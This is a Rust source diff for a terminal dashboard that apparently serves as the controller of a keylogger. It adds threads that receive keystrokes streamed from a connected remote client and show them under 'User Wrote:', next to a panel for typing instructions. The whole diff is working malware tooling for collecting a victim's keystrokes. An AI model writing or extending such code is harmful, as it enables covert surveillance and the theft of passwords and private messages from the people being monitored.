@@ -1,9 +1,10 @@
 use std::thread;
 use std::sync::mpsc;
 use std::time::Duration;
+use std::io::prelude::*;
 
 use color_eyre::Result;
-use crossterm::event::{self, KeyCode};
+use crossterm::event::{self, KeyCode, KeyEvent};
 use ratatui::layout::{Constraint, Layout};
 use ratatui::text::{Line, Span};
 use ratatui::style::{Color, Style};
@@ -12,8 +13,9 @@ use ratatui::{DefaultTerminal, Frame};
 
 use super::Core;
 
-enum AppEvent {
-    Keylogger,
+pub enum AppEvent {
+    Keylogger(String),
+    Terminal(KeyEvent),
     Render,
 }
 
@@ -22,6 +24,7 @@ pub struct App {
     character_index: usize,
     messages: Vec<String>,
     instructions: Vec<String>,
+    logged_keys: Vec<String>,
     core: Core,
 }
 
@@ -32,6 +35,7 @@ impl App {
             messages: Vec::new(),
             instructions: Vec::new(),
             character_index: 0,
+            logged_keys: Vec::new(),
             core: Core::new(),
         }
     }
@@ -90,24 +94,71 @@ impl App {
         self.reset_cursor();
     }
 
-    pub fn run(mut self, terminal: &mut DefaultTerminal) -> Result<()> {
+    pub fn run(&mut self, terminal: &mut DefaultTerminal) -> Result<()> {
         self.messages.push(format!("client is connected from {}", self.core.addr));
+        let (sender, receiver) = mpsc::channel::<AppEvent>();
 
-        loop {
-            terminal.draw(|frame| self.render(frame))?;
+        let sender_render = sender.clone();
+        thread::spawn(move || {
+            loop {
+                if sender_render.send(AppEvent::Render).is_err() {
+                    break;
+                }
+                thread::sleep(Duration::from_millis(16));
+            }
+        });
 
-            if let Some(key) = event::read()?.as_key_press_event() {
-                match key.code {
-                    KeyCode::Enter => self.submit_instructions(),
-                    KeyCode::Char(to_insert) => self.enter_char(to_insert),
-                    KeyCode::Backspace => self.delete_char(),
-                    KeyCode::Left => self.move_cursor_left(),
-                    KeyCode::Right => self.move_cursor_right(),
-                    _ => {}
+        let sender_terminal = sender.clone();
+        thread::spawn(move || {
+            loop {
+                if let Some(key) = event::read().unwrap().as_key_press_event() {
+                    if sender_terminal.send(AppEvent::Terminal(key)).is_err() {
+                        break;
+                    }
                 }
             }
-            thread::sleep(Duration::from_millis(16));
-        }
+        });
+
+        let mut stream = self.core.stream.try_clone().unwrap();
+        let sender_keylogger = sender.clone();
+        thread::spawn(move || {
+            let mut buffer = [0; 512];
+
+            while let Ok(bytes) = stream.read(&mut buffer[..]) { 
+                if bytes == 0 {
+                    break;
+                }
+
+                if let Ok(key) = std::str::from_utf8(&buffer[..bytes]) {
+                    if sender_keylogger.send(AppEvent::Keylogger(key.to_string())).is_err() {
+                        break;
+                    }
+                }
+            }
+        });
+
+        while let Ok(event) = receiver.recv() {
+            match event {
+                AppEvent::Render => {
+                    terminal.draw(|frame| self.render(frame))?;
+                },
+                AppEvent::Terminal(key) => {
+                    match key.code {
+                        KeyCode::Enter => self.submit_instructions(),
+                        KeyCode::Char(to_insert) => self.enter_char(to_insert),
+                        KeyCode::Backspace => self.delete_char(),
+                        KeyCode::Left => self.move_cursor_left(),
+                        KeyCode::Right => self.move_cursor_right(),
+                        KeyCode::Esc => break,
+                        _ => {}
+                    }
+                }
+                AppEvent::Keylogger(key) => {
+                    self.logged_keys.push(key);
+                },
+            }
+        };
+        Ok(())
     }
 
     fn render(&mut self, frame: &mut Frame) {
@@ -147,7 +198,13 @@ impl App {
             .block(Block::bordered());
         frame.render_widget(instructions, layout[1]);
 
-        let keylogger = Paragraph::new(format!("User Wrote:"))
+        let keys = self
+            .logged_keys
+            .iter()
+            .map(|key| key.to_owned())
+            .collect::<String>();
+
+        let keylogger = Paragraph::new(format!("User Wrote: {}", keys))
             .style(Style::default().fg(Color::White))
             .block(Block::bordered());
         frame.render_widget(keylogger, layout[0]);
